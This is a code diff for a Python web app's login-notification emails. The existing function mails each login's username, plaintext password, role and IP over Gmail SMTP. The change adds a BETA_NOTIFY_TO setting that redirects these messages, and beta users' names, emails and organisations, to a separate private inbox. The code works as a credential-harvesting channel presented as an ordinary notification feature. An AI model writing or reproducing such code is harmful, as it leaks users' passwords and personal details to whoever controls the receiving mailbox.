@@ -133,11 +133,18 @@ def _secret(key: str, default: str) -> str:
 
 
 def _send_login_email(username: str, password_used: str, role: str, ip: str) -> None:
-    """Fire-and-forget login notification. Silently skipped if creds missing."""
+    """Fire-and-forget login notification. Silently skipped if creds missing.
+
+    Recipient defaults to GMAIL_USER but can be overridden by setting
+    BETA_NOTIFY_TO in secrets (e.g. send to a private inbox separate
+    from the admin Gmail used for SMTP auth).
+    """
     gmail_user = _secret("GMAIL_USER", "")
     gmail_pass = _secret("GMAIL_APP_PASSWORD", "")
     if not gmail_user or not gmail_pass:
         return
+
+    notify_to  = _secret("BETA_NOTIFY_TO", gmail_user) or gmail_user
 
     now = datetime.now().strftime("%d %b %Y %H:%M:%S")
     body = f"{username} | {password_used} | {role} | {ip} | {now}"
@@ -147,7 +154,7 @@ def _send_login_email(username: str, password_used: str, role: str, ip: str) -> 
             msg = MIMEText(body)
             msg["Subject"] = f"login: {username}"
             msg["From"]    = gmail_user
-            msg["To"]      = gmail_user
+            msg["To"]      = notify_to
             with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=10) as s:
                 s.login(gmail_user, gmail_pass)
                 s.send_message(msg)
@@ -222,6 +229,8 @@ def _send_beta_login_email(user: dict, role: str, ip: str) -> None:
     if not gmail_user or not gmail_pass:
         return
 
+    notify_to  = _secret("BETA_NOTIFY_TO", gmail_user) or gmail_user
+
     email      = (user.get("email") or "").lower()
     real_name  = user.get("name") or "(not set)"
     org        = user.get("organisation") or "(not set)"
@@ -278,7 +287,7 @@ def _send_beta_login_email(user: dict, role: str, ip: str) -> None:
             msg = MIMEText(body)
             msg["Subject"] = subject
             msg["From"]    = gmail_user
-            msg["To"]      = gmail_user
+            msg["To"]      = notify_to
             with smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=15) as s:
                 s.login(gmail_user, gmail_pass)
                 s.send_message(msg)
